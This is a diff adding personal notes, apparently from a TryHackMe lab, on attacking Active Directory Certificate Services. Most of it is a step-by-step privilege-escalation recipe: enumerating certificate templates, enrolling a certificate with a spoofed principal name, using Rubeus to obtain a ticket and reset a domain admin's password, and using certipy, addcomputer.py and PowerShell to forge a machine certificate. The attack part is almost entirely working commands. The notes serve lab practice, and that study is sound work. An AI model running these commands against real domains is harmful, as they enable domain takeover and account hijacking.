@@ -1,0 +1,54 @@
+### ACTIVE DIRECTORY CERTIFICATE SERVICES ###
+## LINKS
+https://tryhackme.com/room/adcertificatetemplates
+
+
+## ENUM TEMPLATE
+cmd.exe
+> net user USERNAME /domain								# check your groups
+> certutil -v -template
+
+
+## CHECK FLAWED TEMPLATE
+# Find template with "Allow Enroll" or "Allow Full Control" permission with your groups
+# Find template with EKU properties with "Client Authentication" is provided
+# Find template with "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT" set to 1
+# Follow https://tryhackme.com/room/adcertificatetemplates for creating the malicious cert
+(mmc > file > add/remove > Certificates > ok > X close > Certificates > Personnal > rclick > All tasks >
+Request new cert > Next > next > more info... > Common name > "vulncert" > UserPrincipal name >
+use UPN account ex. "svc.gitlab@domain.com" > Add > Add > Ok > select the vuln template you found > Enroll >
+Finish > check you got the cert > check details of cert > SAN Subject Alternative Name should be as exemple
+"svc.gitlab@domain.com" > rclick on cert > All tasks > Export > next > yes export private key > next > next >
+add pasword P@s5w0rD > next > select a name and finish export.)
+
+# get our TGT
+> .\Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:vulncert.pfx /password:P@s5w0rD /outfile:svc.gitlab.kirbi /domain:lunar.eruca.com /dc:10.10.69.219
+# /!\ [*] Ticket written to svc.gitlab.kirbi
+# open Active Directory Users and Computers
+# choose to change password of one DA
+> .\Rubeus.exe changepw /ticket:svc.gitlab.kirbi /new:newP@ss /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-nread
+# if succes you could log with this account now or:
+> runas /user:lunar.eruca.com\DA_USERNAME cmd.exe
+
+
+## ADCS Template
+# configure /etc/hosts
+10.10.170.248 lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca.com
+certipy req 'DOMAIN/USER:PASS@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template User	#gen certificate low user
+certipy auth -pfx USER.pfx								#check if cert is valid
+
+# add a new computer to the domain
+addcomputer.py 'DOMAIN/USER:PASS' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'
+# new cert for new machine
+certipy req 'DOMAIN/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
+certipy auth -pfx thmpc.pfx								#check new cert if valid
+
+# log into the machine and launch powershell
+> powershell
+> Get-ADComputer THMPC -properties dnshostname,serviceprincipalname			#get current attribute
+> Set-ADComputer THMPC -ServicePrincipalName @{}					#remove SPN attribute
+> Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com				#set domain
+> Get-ADComputer THMPC -properties dnshostname,serviceprincipalname			#check modification
+
+# now forging malicious cert
+certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
